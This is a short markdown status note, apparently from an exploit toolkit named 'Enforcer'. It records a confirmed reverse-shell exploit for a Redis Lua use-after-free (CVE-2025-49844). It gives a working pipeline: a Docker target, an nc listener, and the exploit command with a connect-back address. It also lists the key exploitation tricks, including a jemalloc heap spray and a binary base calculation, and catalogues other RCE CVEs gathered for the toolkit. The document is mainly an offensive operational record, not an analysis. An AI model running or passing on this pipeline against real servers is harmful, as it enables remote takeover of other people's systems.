# PentaRedis — CVE-2025-49844 Redis Lua UAF RCE

## Status: CONFIRMED EXPLOITABLE

Reverse shell achieved against Redis 8.2.1-bookworm (Docker). CVSS 10.0, Wiz Research.

## Exploit Location
- Standalone: `/root/sploits/Enforcer.v2/pentaredis.py` (1676 lines) — 4 RCE techniques + CONFIG detection
- PoC: `/root/sploits/Redis2/CVE-2025-49844/CVE-2025-49844.py` (1442 lines)
- Enforcer module: `remote/redis_rce` (CVE-2025-49844)

## Working Exploit Pipeline
1. `docker run -d --name red724 -p 16379:6379 redis:8.2.1-bookworm`
2. `nc -lvnp 4545 &`
3. `python3 CVE-2025-49844.py -H 127.0.0.1 -P 16379 -l 172.17.0.1 -p 4545`
4. Shell connects from Docker container within ~10 seconds

## Key Breakthroughs
- **32-byte Proto spray** makes jemalloc bin match chunkname → UAF works
- **Empirical binary_base**: `L_state - constant = l_alloc` (constant per Redis instance)
- **Docker networking**: use `172.17.0.1` for connect-back (not `127.0.0.1`)

## All CVEs Catalogued for Enforcer
- CVE-2025-49844: Redis Lua UAF (RediShell) — CONFIRMED EXPLOITABLE
- CVE-2026-5027: Langflow AI RCE
- CVE-2026-10520: Ivanti Sentry RCE
- CVE-2026-25089: FortiSandbox RCE
- CVE-2026-47291: HTTP.sys integer overflow (CVSS 9.8, recon only)
